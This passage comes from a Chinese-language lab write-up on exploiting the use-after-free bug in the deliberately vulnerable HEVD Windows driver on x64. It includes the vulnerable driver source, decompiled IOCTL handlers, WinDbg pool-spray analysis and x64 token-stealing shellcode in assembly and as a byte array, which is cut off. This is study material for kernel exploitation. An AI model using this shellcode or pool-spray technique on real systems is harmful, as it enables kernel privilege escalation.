<li>EPROCESS 在 KTHREAD + 0xb8</li>
<li>ActiveProcessLinks 在 EPROCESS + 0x448</li>
<li>ActiveProcessLinks 距离 Token 距离</li>
<li>token 在 EPROCESS + 0x4b8 处</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">    mov rdx, [gs:<span class="number">188</span>h]       ;get _ETHREAD pointer from KPCR</span><br><span class="line">    mov r8, [rdx+<span class="number">0xb8</span>]       ;_EPROCESS (see PsGetCurrentProcess function)</span><br><span class="line">    mov r9, [r8+<span class="number">0x448</span>]       ;ActiveProcessLinks list head</span><br><span class="line">    mov rcx, [r9]            ;follow link to first process in list</span><br><span class="line">find_system_proc:</span><br><span class="line">    mov rdx, [rcx<span class="number">-8</span>]         ;offset from ActiveProcessLinks to UniqueProcessId</span><br><span class="line">    cmp rdx, <span class="number">4</span>               ;process with ID <span class="number">4</span> is System process</span><br><span class="line">    jz found_it</span><br><span class="line">    mov rcx, [rcx]           ;follow _LIST_ENTRY Flink pointer</span><br><span class="line">    cmp rcx, r9              ;see <span class="keyword">if</span> back at list head</span><br><span class="line">    jnz find_system_proc</span><br><span class="line">found_it:</span><br><span class="line">    mov rax, [rcx+<span class="number">0x80</span>]      ;offset from ActiveProcessLinks to Token</span><br><span class="line">    <span class="keyword">and</span> al, <span class="number">0xf0</span>             ;clear low <span class="number">4</span> bits of _EX_FAST_REF structure</span><br><span class="line">    mov [r8+<span class="number">0x4b8</span>], rax      ;replace current process token with system token</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>

<h2 id="寻找合适的对象"><a href="#寻找合适的对象" class="headerlink" title="寻找合适的对象"></a>寻找合适的对象</h2><p>池喷射需要找到适合大小的内核对象以及池对象，使用windbg分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!object \ObjectTypes</span><br><span class="line"></span><br><span class="line">dt nt!_OBJECT_TYPE &lt;addr&gt;</span><br><span class="line">dt nt!_OBJECT_TYPE_INITIALIZER &lt;addr&gt;</span><br></pre></td></tr></table></figure>

<h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><p>在存在漏洞的驱动里，对象free后没有置为NULL</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">FreeUaFObjectNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VOID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_UseAfterFreeObjectNonPagedPool)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Freeing UaF Object\n&quot;</span>);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="built_in">STRINGIFY</span>(POOL_TAG));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SECURE</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Secure Note: This is secure because the developer is setting</span></span><br><span class="line">            <span class="comment">// &#x27;g_UseAfterFreeObjectNonPagedPool&#x27; to NULL once the Pool chunk is being freed</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">ExFreePoolWithTag</span>((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Set to NULL to avoid dangling pointer</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            g_UseAfterFreeObjectNonPagedPool = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Vulnerability Note: This is a vanilla Use After Free vulnerability</span></span><br><span class="line">            <span class="comment">// because the developer is not setting &#x27;g_UseAfterFreeObjectNonPagedPool&#x27; to NULL.</span></span><br><span class="line">            <span class="comment">// Hence, g_UseAfterFreeObjectNonPagedPool still holds the reference to stale pointer</span></span><br><span class="line">            <span class="comment">// (dangling pointer)</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">ExFreePoolWithTag</span>((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">            Status = STATUS_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = <span class="built_in">GetExceptionCode</span>();</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就可以UAF调用callback函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">UseUaFObjectNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VOID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_UseAfterFreeObjectNonPagedPool)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Using UaF Object\n&quot;</span>);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool-&gt;Callback: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool-&gt;Callback);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Calling Callback\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (g_UseAfterFreeObjectNonPagedPool-&gt;Callback)</span><br><span class="line">            &#123;</span><br><span class="line">                g_UseAfterFreeObjectNonPagedPool-&gt;<span class="built_in">Callback</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Status = STATUS_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = <span class="built_in">GetExceptionCode</span>();</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>两个版本</p>
<ul>
<li>NonPagedPool 这个池的内容是可以执行的</li>
<li>一个是 <code>Nx</code> 版本，也就是不可执行版本。</li>
</ul>
<p>g_UseAfterFreeObjectNonPagedPool 初始化</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">AllocateUaFObjectNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VOID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    PUSE_AFTER_FREE_NON_PAGED_POOL UseAfterFree = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Allocating UaF Object\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Allocate Pool chunk</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        UseAfterFree = (PUSE_AFTER_FREE_NON_PAGED_POOL)<span class="built_in">ExAllocatePoolWithTag</span>(</span><br><span class="line">            NonPagedPool,</span><br><span class="line">            <span class="built_in">sizeof</span>(USE_AFTER_FREE_NON_PAGED_POOL),</span><br><span class="line">            (ULONG)POOL_TAG</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!UseAfterFree)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Unable to allocate Pool chunk</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Unable to allocate Pool chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Status = STATUS_NO_MEMORY;</span><br><span class="line">            <span class="keyword">return</span> Status;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="built_in">STRINGIFY</span>(POOL_TAG));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Type: %s\n&quot;</span>, <span class="built_in">STRINGIFY</span>(NonPagedPool));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Size: 0x%zX\n&quot;</span>, <span class="built_in">sizeof</span>(USE_AFTER_FREE_NON_PAGED_POOL));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, UseAfterFree);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Fill the buffer with ASCII &#x27;A&#x27;</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">RtlFillMemory</span>((PVOID)UseAfterFree-&gt;Buffer, <span class="built_in">sizeof</span>(UseAfterFree-&gt;Buffer), <span class="number">0x41</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Null terminate the char buffer</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        UseAfterFree-&gt;Buffer[<span class="built_in">sizeof</span>(UseAfterFree-&gt;Buffer) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Set the object Callback function</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        UseAfterFree-&gt;Callback = &amp;UaFObjectCallbackNonPagedPool;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Assign the address of UseAfterFree to a global variable</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        g_UseAfterFreeObjectNonPagedPool = UseAfterFree;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] UseAfterFree Object: 0x%p\n&quot;</span>, UseAfterFree);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] UseAfterFree-&gt;Callback: 0x%p\n&quot;</span>, UseAfterFree-&gt;Callback);</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = <span class="built_in">GetExceptionCode</span>();</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>UAF结构体</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_USE_AFTER_FREE_NON_PAGED_POOL</span></span><br><span class="line">&#123;</span><br><span class="line">    FunctionPointer Callback;</span><br><span class="line">    CHAR Buffer[<span class="number">0x54</span>];</span><br><span class="line">&#125; USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL;</span><br></pre></td></tr></table></figure>

<p>寻找IoctlCode：反编译</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222013</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">AllocateUaFObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_64;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x222017</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">UseUaFObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_64;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x22201B</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">FreeUaFObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>NonPagedPool，其alloc的大小为0x60</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">PoolWithTag = (<span class="type">const</span> <span class="type">void</span> **)<span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPool, <span class="number">0x60</span>ui64, <span class="number">0x6B636148</span>u);</span><br></pre></td></tr></table></figure>

<p>思路：UAF劫持callback函数，让其执行提权的代码。</p>
<h3 id="Exploit-NonPagedPool"><a href="#Exploit-NonPagedPool" class="headerlink" title="Exploit NonPagedPool"></a>Exploit NonPagedPool</h3><p>加载驱动，查看是否加载成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; lm m H*</span><br></pre></td></tr></table></figure>

<p>打断点和显示DbgPrint信息</p>
<ul>
<li><code>DebugBreak()</code> 应用程序触发kenel debug断点</li>
</ul>
<p>打印出所有的信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; ed nt!Kd_DEFAULT_MASK 0xFFFFFFFF</span><br></pre></td></tr></table></figure>

<p>因为存在 <code>Tag</code> 可以寻找pool，比较花时间，可以在DebugView里寻找信息.<code>!poolfind</code> 命令不会计算头部，<code>!pool</code> 会计算</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !poolused 2 Hack</span><br><span class="line">0: kd&gt; !poolfind Hack -nonpaged</span><br><span class="line">3: kd&gt; g</span><br><span class="line">***** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><br><span class="line">[+] Allocating UaF Object</span><br><span class="line">[+] Pool Tag: &#x27;kcaH&#x27;</span><br><span class="line">[+] Pool Type: NonPagedPool</span><br><span class="line">[+] Pool Size: 0x60</span><br><span class="line">[+] Pool Chunk: 0xFFFFA78BEF702B50</span><br><span class="line">[+] UseAfterFree Object: 0xFFFFA78BEF702B50</span><br><span class="line">[+] g_UseAfterFreeObjectNonPagedPool: 0xFFFFA78BEF702B50</span><br><span class="line">[+] UseAfterFree-&gt;Callback: 0xFFFFF8012D287CD0</span><br><span class="line">****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">0033:00007ff9`b21bb6d2 cc              int     3</span><br><span class="line">1: kd&gt; !pool 0xFFFFA78BEF702B50</span><br><span class="line">Pool page ffffa78bef702b50 region is Nonpaged pool</span><br><span class="line"> ffffa78bef702000 size:   30 previous size:    0  (Free)       ....</span><br><span class="line"> # ...</span><br><span class="line"> ffffa78bef7029a0 size:   90 previous size:    0  (Allocated)  FSim</span><br></pre></td></tr></table></figure>

<p>查看内存信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1: kd&gt; dq 0xFFFFA78BEF702B50</span><br><span class="line">ffffa78b`ef702b50  fffff801`2d287cd0 41414141`41414141</span><br><span class="line">ffffa78b`ef702b60  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702b70  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702b80  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702b90  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702ba0  41414141`41414141 00000000`00414141</span><br><span class="line">ffffa78b`ef702bb0  fe8fc5c0`d7167489 00000000`00000000</span><br><span class="line">ffffa78b`ef702bc0  00000000`00000000 ffffa78b`ef714039</span><br></pre></td></tr></table></figure>


<p>pool 实际大小，需要加入一个头部信息，并且内存对齐。pool header</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> ffffa78bef702900 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7029a0 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"></span><br><span class="line">1: kd&gt; !poolused 2 Hack</span><br><span class="line">Using a machine size of 1ffe7e pages to configure the kd cache</span><br><span class="line">....</span><br><span class="line"> Sorting by NonPaged Pool Consumed</span><br><span class="line">               NonPaged                  Paged</span><br><span class="line"> Tag     Allocs         Used     Allocs         Used</span><br><span class="line"> Hack         1          112          0            0	UNKNOWN pooltag &#x27;Hack&#x27;, please update pooltag.txt</span><br><span class="line">TOTAL         1          112          0            0</span><br></pre></td></tr></table></figure>

<p>因此实际获得的大小：0x70，内存对齐</p>
<p>内核池喷射是一项使池中分配位置可预测的艺术。这意味着你可以知道一个块将被分配到哪里，哪些块在其附近。</p>
<ul>
<li>微软有一个<a href="https://learn.microsoft.com/zh-cn/windows/win32/sysinfo/kernel-objects">内核对象 - Win32 apps</a>列表，我们可以通过调用用户模式功能来创建内核对象，</li>
</ul>
<p>触发UAF前，需要使用 heap fengshui</p>
<ul>
<li>可以不布局，看来几篇文章，直接利用 <a href="https://blog.csdn.net/qq_36918532/article/details/123417458">(3)</a></li>
<li><code>NtAllocateReserveObject</code> 布局，但是在x64下得到错误的</li>
<li>x64下可以使用<code>CreatePipe</code>和<code>WriteFile</code>来进行NonPagedPool喷射，缓冲区大小：PoolSize-HeaderSize(0x48)，NpFr tag。<a href="https://securityinsecurity.github.io/exploiting-hevd-use-after-free/">(4)</a>[(5)](<a href="https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/">Windows Kernel Exploitation – HEVD x64 Use-After-Free • Vulndev</a>)</li>
</ul>
<p>free后被合并，因此为了提高成功率，就创建hole，然后使用漏洞对象进行占位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*ffffa78bef702a30 size:  5b0 previous size:    0  (Free)      *...~</span><br></pre></td></tr></table></figure>

<p>参考<a href="https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/">(6)</a>，获得两个句柄 <code>0xac, 0xb0</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !poolused 2 NpFr</span><br><span class="line">Using a machine size of 1ffe7e pages to configure the kd cache</span><br><span class="line">...</span><br><span class="line"> Sorting by NonPaged Pool Consumed</span><br><span class="line">               NonPaged                  Paged</span><br><span class="line"> Tag     Allocs         Used     Allocs         Used</span><br><span class="line"></span><br><span class="line"> NpFr         1          112          0            0	DATA_ENTRY records (read/write buffers) , Binary: npfs.sys</span><br><span class="line"></span><br><span class="line">TOTAL         1          112          0            0</span><br></pre></td></tr></table></figure>

<p>写入UAF，存在一个FAKE_OBJECT，可以进行写入</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x22201F</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">AllocateFakeObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_64;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">AllocateFakeObjectNonPagedPoolIoctlHandler</span><span class="params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  Parameters = IrpSp-&gt;Parameters.CreatePipe.Parameters;</span><br><span class="line">  result = <span class="number">0xC0000001</span>;</span><br><span class="line">  <span class="keyword">if</span> ( Parameters )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">AllocateFakeObjectNonPagedPool</span>((_FAKE_OBJECT_NON_PAGED_POOL *)Parameters);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">AllocateFakeObjectNonPagedPool</span><span class="params">(_FAKE_OBJECT_NON_PAGED_POOL *UserFakeObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _OWORD *PoolWithTag; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Creating Fake Object\n&quot;</span>);</span><br><span class="line">  PoolWithTag = <span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPool, <span class="number">0x5C</span>ui64, <span class="number">0x6B636148</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( PoolWithTag )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="string">&quot;&#x27;kcaH&#x27;&quot;</span>);</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Type: %s\n&quot;</span>, <span class="string">&quot;NonPagedPool&quot;</span>);</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Size: 0x%zX\n&quot;</span>, <span class="number">0x5C</span>ui64);</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, PoolWithTag);</span><br><span class="line">    <span class="built_in">ProbeForRead</span>(UserFakeObject, <span class="number">0x5C</span>ui64, <span class="number">1u</span>);</span><br><span class="line">    *PoolWithTag = *(_OWORD *)UserFakeObject-&gt;Buffer;</span><br><span class="line">    PoolWithTag[<span class="number">1</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">16</span>];</span><br><span class="line">    PoolWithTag[<span class="number">2</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">32</span>];</span><br><span class="line">    PoolWithTag[<span class="number">3</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">48</span>];</span><br><span class="line">    PoolWithTag[<span class="number">4</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">64</span>];</span><br><span class="line">    *((_QWORD *)PoolWithTag + <span class="number">10</span>) = *(_QWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">80</span>];</span><br><span class="line">    *((_DWORD *)PoolWithTag + <span class="number">22</span>) = *(_DWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">88</span>];</span><br><span class="line">    *((_BYTE *)PoolWithTag + <span class="number">91</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Fake Object: 0x%p\n&quot;</span>, PoolWithTag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[-] Unable to allocate Pool chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3221225495</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打两个断点，成功写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3: kd&gt; dq 0xFFFFA78BF933D540</span><br><span class="line">ffffa78b`f933d540  00000000`deadbeef 00000000`00000000</span><br><span class="line">ffffa78b`f933d550  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d560  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d570  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d580  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d590  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d5a0  6b636148`02070000 00000000`00000000</span><br><span class="line">ffffa78b`f933d5b0  00000000`deadbeef 00000000`00000000</span><br></pre></td></tr></table></figure>

<h4 id="shellcode-1"><a href="#shellcode-1" class="headerlink" title="shellcode"></a>shellcode</h4><p>使用keystone生成汇编</p>
<p>或者参考<a href="https://github.com/vportal/HEVD/blob/main/HEVD_UAF_WIN10_21H2.cpp">HEVD&#x2F;HEVD_UAF_WIN10_21H2.cpp</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&#123; <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC3</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x9B</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x81</span>, <span class="number">0xEB</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span 